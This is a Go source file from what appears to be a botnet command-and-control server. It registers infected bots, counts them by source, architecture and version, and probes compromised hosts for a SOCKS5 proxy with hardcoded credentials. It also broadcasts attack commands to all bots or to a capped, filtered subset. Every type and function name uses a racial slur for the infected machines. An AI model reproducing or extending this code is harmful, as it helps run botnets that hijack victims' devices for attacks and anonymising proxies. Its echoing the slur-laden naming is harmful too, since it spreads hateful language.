package slave_v2

import (
	"advanced-telnet-cnc/source/config"
	"net"
	"sync"
	"time"
)

type NiggerList struct {
	ID int

	Clients map[int]*Nigger
	Proxy   map[*Nigger]string

	Mutex   *sync.Mutex
	count int
}

var (
	List = NewClientList()
)

func NewClientList() *NiggerList {
	c := &NiggerList{
		ID:             0,
		Clients:        make(map[int]*Nigger),
		Mutex:          &sync.Mutex{},
		Proxy:          make(map[*Nigger]string),
		count:          0,
	}
	return c
}

func (list *NiggerList) Count() int {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()

	return list.count
}

func (list *NiggerList) Distribution() map[string]int {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()

	res := make(map[string]int)
	for _, v := range list.Clients {
		if _, ok := res[v.Source]; ok {
			res[v.Source]++
		} else {
			res[v.Source] = 1
		}
	}
	return res
}

func (list *NiggerList) Arches() map[string]int {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()

	res := make(map[string]int)
	for _, v := range list.Clients {
		if _, ok := res[v.Arch]; ok {
			res[v.Arch]++
		} else {
			res[v.Arch] = 1
		}
	}
	return res
}

func (list *NiggerList) Versions() map[string]int {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()

	res := make(map[string]int)
	for _, v := range list.Clients {
		if _, ok := res[v.Version]; ok {
			res[v.Version]++
		} else {
			res[v.Version] = 1
		}
	}
	return res
}

func (list *NiggerList) TestForProxy(c *Nigger) {
	host, _, err := net.SplitHostPort(c.RemoteAddr().String())
	if err != nil {
		return
	}

	dial, err := net.DialTimeout("tcp", host+":26721", 5*time.Second)
	if err != nil {
		return
	}

	defer dial.Close()

	config.Logger.Info("Proxy found", "url", "socks5://lucy_user:password_meow@"+host+":26721")
	list.Mutex.Lock()
	list.Proxy[c] = "socks5://lucy_user:password_meow@" + host + ":26721"
	list.Mutex.Unlock()
}

func (list *NiggerList) AddNigger(c *Nigger) {
	list.Mutex.Lock()
	list.ID++
	c.ID = list.ID
	list.Clients[c.ID] = c
	list.count++
	list.Mutex.Unlock()

	config.Logger.Info("Added nigger", "source", c.Source, "arch", c.Arch, "remote", c.RemoteAddr().String())
	if c.Version == "2.0.3_socks5" {
		go list.TestForProxy(c)
	}
}

func (list *NiggerList) TerminateNigger(c *Nigger) {
	list.Mutex.Lock()
	if _, ok := list.Clients[c.ID]; ok {
		delete(list.Clients, c.ID)
		delete(list.Proxy, c)
		list.count--
	}
	list.Mutex.Unlock()

	config.Logger.Info("Terminated nigger", "source", c.Source, "arch", c.Arch, "remote", c.RemoteAddr().String())
}

func (list *NiggerList) QueueCommandToNiggers(buf []byte, maxNiggers int, niggerCategory string) {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()

	if maxNiggers == -1 {
		for _, v := range list.Clients {
			if niggerCategory == "" || niggerCategory == v.Source {
				_, _ = v.Write(buf)
			}
		}
	} else {
		var count int
		for _, v := range list.Clients {
			if count >= maxNiggers {
				break
			}
			if niggerCategory == "" || niggerCategory == v.Source {
				_, err := v.Write(buf)
				if err == nil {
					count++
				}
			}
		}
	}
}
